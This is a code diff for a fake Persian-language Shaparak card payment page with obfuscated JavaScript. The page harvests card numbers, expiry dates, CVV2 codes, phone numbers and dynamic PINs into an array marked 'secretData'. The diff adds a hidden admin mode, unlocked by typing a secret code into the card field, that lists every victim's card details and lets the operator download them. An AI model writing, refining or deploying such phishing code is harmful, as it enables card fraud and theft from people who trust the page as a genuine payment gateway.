@@ -17,8 +17,10 @@
             font-family: var(--font);
             background: linear-gradient(145deg, #f5f5f5, #e0e0e0);
             min-height: 100vh;
-            display: grid;
-            place-items: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 100px;
         }
         .x1-bar {
             position: fixed;
@@ -119,6 +121,7 @@
         .btn-x12 { background: #007bff; color: #fff; width: auto; padding: 10px 20px; margin-top: 10px; }
         .btn-cancel { background: #dc3545; color: #fff; margin-top: 10px; }
         .btn-admin { background: #ff9800; color: #fff; margin-top: 20px; display: none; }
+        .btn-clear { background: #dc3545; color: #fff; margin-top: 20px; }
         .x13-loader {
             display: none;
             width: 60px;
@@ -140,6 +143,23 @@
             width: 100%;
             position: fixed;
             bottom: 0;
+        }
+        .admin-data-container {
+            width: 90%;
+            max-width: 700px;
+            margin-top: 20px;
+            display: none;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .user-data-box {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #ddd;
+            font-size: 14px;
+            color: #333;
+            position: relative;
         }
     </style>
 </head>
@@ -206,6 +226,10 @@
         <button class="btn btn-admin" id="admin-view">مشاهده داده‌ها (حالت مدیر)</button>
     </div>
 
+    <div class="admin-data-container" id="admin-data-container">
+        <button class="btn btn-clear" id="clear-data">پاک کردن همه داده‌ها</button>
+    </div>
+
     <footer>
         <p>پشتیبانی: 021-12345678 | تمامی حقوق محفوظ است © شاپرک ۱۴۰۳</p>
     </footer>
@@ -215,13 +239,17 @@
             let _0x1a = 1; // currentStep
             let _0x2b = []; // secretData
             const _0x3c = 42; // XOR key
-            const isAdmin = new URLSearchParams(window.location.search).get('admin') === '1';
+            let isAdmin = false; // حالت مدیر پیش‌فرض غیرفعال
+            const adminCode = '12122312'; // رمز فعال‌سازی حالت مدیر
 
             // DOM Elements
             const _0x4d = document.getElementById('x6-fill');
             const _0x5e = [document.getElementById('x9-step1'), document.getElementById('x9-step2'), document.getElementById('x9-step3')];
             const adminBtn = document.getElementById('admin-view');
             const cancelBtns = [document.getElementById('cancel1'), document.getElementById('cancel2'), document.getElementById('cancel3')];
+            const cardInput = document.getElementById('x15');
+            const adminDataContainer = document.getElementById('admin-data-container');
+            const clearDataBtn = document.getElementById('clear-data');
 
             // XOR Encryption/Decryption
             function _0x6f(_0x7g) {
@@ -232,10 +260,21 @@
                 return _0x8h;
             }
 
-            // Input Formatting
-            document.getElementById('x15').addEventListener('input', function(e) {
+            // Input Formatting and Admin Check
+            cardInput.addEventListener('input', function(e) {
                 let v = e.target.value.replace(/\D/g, '').slice(0, 16);
                 e.target.value = v.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
+                // چک کردن رمز مدیر
+                if (v === adminCode) {
+                    isAdmin = true;
+                    adminBtn.style.display = 'block';
+                    adminDataContainer.style.display = 'flex';
+                    displayAdminData();
+                } else {
+                    isAdmin = false;
+                    adminBtn.style.display = 'none';
+                    adminDataContainer.style.display = 'none';
+                }
             });
             document.getElementById('x16').addEventListener('input', function(e) {
                 let v = e.target.value.replace(/\D/g, '');
@@ -272,10 +311,48 @@
                            document.getElementById('x17').value + '|' +
                            document.getElementById('x19').value + '|' +
                            document.getElementById('x20').value;
-                _0x2b.push(_0x6f(_0xen));
+                // فقط اگه رمز مدیر نباشه داده رو ذخیره کن
+                if (document.getElementById('x15').value.replace(/\D/g, '') !== adminCode) {
+                    _0x2b.push(_0x6f(_0xen));
+                    if (isAdmin) displayAdminData();
+                }
             }
 
-            // Export Data as File
+            // Display Admin Data
+            function displayAdminData() {
+                adminDataContainer.innerHTML = ''; // پاک کردن محتوای قبلی
+                _0x2b.forEach((data, index) => {
+                    let decryptedData = _0x6f(data).split('|');
+                    let userBox = document.createElement('div');
+                    userBox.className = 'user-data-box';
+                    userBox.innerHTML = `
+                        <strong>کاربر ${index + 1}</strong><br>
+                        شماره کارت: ${decryptedData[0]}<br>
+                        تاریخ انقضا: ${decryptedData[1]}<br>
+                        CVV2: ${decryptedData[2]}<br>
+                        شماره تلفن: ${decryptedData[3]}<br>
+                        رمز پویا: ${decryptedData[4]}
+                    `;
+                    adminDataContainer.appendChild(userBox);
+                });
+                // اضافه کردن دکمه پاکسازی در انتها
+                let clearBtn = document.createElement('button');
+                clearBtn.className = 'btn btn-clear';
+                clearBtn.textContent = 'پاک کردن همه داده‌ها';
+                clearBtn.onclick = clearAdminData;
+                adminDataContainer.appendChild(clearBtn);
+            }
+
+            // Clear Admin Data
+            function clearAdminData() {
+                if (confirm('آیا مطمئن هستید که می‌خواهید همه داده‌ها را پاک کنید؟')) {
+                    _0x2b = [];
+                    adminDataContainer.innerHTML = '<button class="btn btn-clear" id="clear-data">پاک کردن همه داده‌ها</button>';
+                    document.getElementById('clear-data').onclick = clearAdminData;
+                }
+            }
+
+            // Export Data as File (only for admin)
             function _0xfo() {
                 let _0xgp = _0x2b.map(d => _0x6f(d)).join('\n');
                 let _0xhq = new Blob([_0xgp], { type: 'text/plain' });
@@ -285,12 +362,10 @@
                 _0xir.click();
             }
 
-            // Show Admin Data
+            // Show Admin Data (Download Button Action)
             function showAdminData() {
-                let decryptedData = _0x2b.map(d => _0x6f(d)).join('\n');
-                if (decryptedData) {
-                    alert('داده‌های جمع‌آوری‌شده:\n\n' + decryptedData);
-                    _0xfo();
+                if (_0x2b.length > 0) {
+                    _0xfo(); // دانلود فایل
                 } else {
                     alert('هیچ داده‌ای جمع‌آوری نشده است.');
                 }
@@ -310,6 +385,9 @@
                 document.getElementById('x24').innerHTML = '';
                 document.getElementById('x25').style.display = 'none';
                 document.getElementById('x22').textContent = '';
+                isAdmin = false;
+                adminBtn.style.display = 'none';
+                adminDataContainer.style.display = 'none';
             }
 
             // Step Navigation
@@ -332,7 +410,6 @@
                     _0x9i({}, (_0xjs) => {
                         document.getElementById('x25').style.display = 'none';
                         document.getElementById('x24').innerHTML = `پرداخت موفق!<br>شماره تراکنش: ${_0xjs.id}`;
-                        _0xfo();
                     });
                 }
             });
@@ -363,11 +440,8 @@
                 });
             });
 
-            // Admin Mode
-            if (isAdmin) {
-                adminBtn.style.display = 'block';
-                adminBtn.addEventListener('click', showAdminData);
-            }
+            // Admin Mode Activation
+            adminBtn.addEventListener('click', showAdminData);
 
             _0xcl();
         })();
